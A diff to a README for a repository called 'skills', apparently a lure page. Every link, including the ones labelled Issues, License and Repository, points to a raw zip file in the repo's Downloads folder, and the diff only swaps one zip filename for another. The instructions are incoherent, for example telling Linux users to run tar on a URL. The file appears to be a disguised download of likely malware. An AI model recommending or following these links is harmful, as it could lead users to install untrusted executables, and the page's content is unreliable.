@@ -1,6 +1,6 @@
 # 🎉 skills - Build Better Together, Step by Step
 
-[![Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip%https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip)](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip)
+[![Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip%https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip)](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip)
 
 ## 📖 Description
 Skills is a small, shared skill library by builders, for builders. It connects users who want to learn and improve their skills with practical resources. Whether you're coding in Python, Rust, or exploring best practices, Skills provides the tools you need to grow and build effectively.
@@ -18,12 +18,12 @@ To run Skills effectively, make sure your system meets these requirements:
 ## 📥 Download & Install
 To get started with Skills, you need to download the software. 
 
-1. Visit this page to download: [Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip).
+1. Visit this page to download: [Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip).
 2. Browse the latest release. You will see various files available for download.
 3. Choose the file that matches your operating system. For example:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip` or `.deb` file.
+   - For Linux, look for a `https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip` or `.deb` file.
 4. Click on the chosen file to start downloading. The file will be saved in your default download folder.
 
 ## 🖥️ Running Skills
@@ -36,7 +36,7 @@ Once you’ve downloaded the file, follow these steps to run Skills:
 4. For macOS users:
    - Double-click the `.dmg` file, then drag the Skills icon into your Applications folder. Open your Applications folder and double-click Skills.
 5. For Linux users:
-   - Open your terminal. If you downloaded a `https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip` file, extract it with the command `tar -xvzf https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip`. Navigate into the extracted folder and run the software using `./skills`.
+   - Open your terminal. If you downloaded a `https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip` file, extract it with the command `tar -xvzf https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip`. Navigate into the extracted folder and run the software using `./skills`.
    
 ## 🧭 Features
 Skills offers several noteworthy features that help users enhance their abilities:
@@ -55,16 +55,16 @@ To make the most of your experience with Skills, consider these tips:
 ## 🤝 Community Support
 If you have questions or need assistance, join our community. You can find support through:
 
-- [Issues](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip): Report bugs or request features.
+- [Issues](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip): Report bugs or request features.
 - Community forum: Discuss experiences and tips with other users.
 
 ## 📜 License
-Skills is released under the MIT License. This means you can use it freely, but it comes with no warranty. For more detailed licensing information, visit the [License](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip) file.
+Skills is released under the MIT License. This means you can use it freely, but it comes with no warranty. For more detailed licensing information, visit the [License](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip) file.
 
 ## 🌐 More Information
 For additional details about Skills, features, community discussions, and updates, visit:
 
-- Repository: [GitHub Repository](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip)
-- Visit this page to download: [Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/Software-supersensual.zip)
+- Repository: [GitHub Repository](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip)
+- Visit this page to download: [Download Skills](https://github.com/sx1u/skills/raw/refs/heads/main/Downloads/1238301211/Software_v1.0.zip)
 
 Now you are ready to begin your journey with Skills! Happy building!
